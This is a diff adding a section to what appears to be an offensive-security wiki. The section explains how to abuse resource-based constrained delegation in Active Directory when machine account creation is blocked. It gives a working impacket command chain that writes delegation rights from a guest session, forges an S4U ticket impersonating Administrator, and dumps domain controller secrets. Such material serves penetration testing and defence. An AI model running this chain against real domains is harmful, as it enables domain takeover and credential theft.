@@ -547,3 +547,35 @@ Cross-references: [[ad-enumeration]], [[ad-lateral-movement]], [[pass-the-hash]]
 - [[kerberos-tickets]]
 - [[ms14-068-checksum-validation]]
 - [[roasting-timeroasting]]
+
+## RBCD when MachineAccountQuota = 0 (reuse an existing SPN account)
+
+The usual RBCD recipe creates a fake machine account as the `delegate-from` principal, which
+needs `ms-DS-MachineAccountQuota >= 1`. When MAQ is 0 you cannot add a machine, but RBCD does
+**not** require a *machine* account: any account you control that has a `servicePrincipalName`
+(a user acting as a service account) is a valid S4U `delegate-from`. So if you have already
+cracked/obtained a Kerberoastable user (it has an SPN by definition), reuse it and skip machine
+creation entirely.
+
+Prerequisites: write access (`GenericWrite`/`GenericAll`/`WriteProperty`) to the target computer
+object, plus any principal you control that owns an SPN. The write can come from a surprisingly
+low-privileged principal, e.g. a DACL that grants `BUILTIN\Guests` GenericWrite over a DC computer
+object is exploitable from the guest/null session (pass the empty-password NT hash
+`31d6cfe0d16ae931b73c59d7e0c089c0` since impacket prompts for an empty password on a TTY-less run).
+
+```bash
+# writer = guest (Guests has GenericWrite on the DC); delegate-from = a user WE control that has an SPN
+impacket-rbcd -delegate-to 'DC01$' -delegate-from 'svc_user' -action write \
+  -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/guest
+# S4U as that SPN user -> impersonate a DA on the target computer
+impacket-getST -spn cifs/DC01.domain.local -impersonate Administrator \
+  'domain.local/svc_user:<cracked-pass>' -dc-ip <DC>
+KRB5CCNAME=Administrator@cifs_*.ccache impacket-secretsdump -k -no-pass DC01.domain.local
+```
+
+Chains cleanly off Kerberoasting-without-pre-auth: an AS-REP-roastable account yields the SPN
+user's TGS credlessly, and that same SPN user then becomes the RBCD `delegate-from`. Also enumerate
+user SPNs with an object-class filter (`(&(servicePrincipalName=*)(objectCategory=person))`) so the
+DC machine account's many SPNs do not mask the one Kerberoastable user. See [[roasting-kerberoasting]].
+
+<!-- promoted-slug: rbcd-no-maq-existing-spn -->
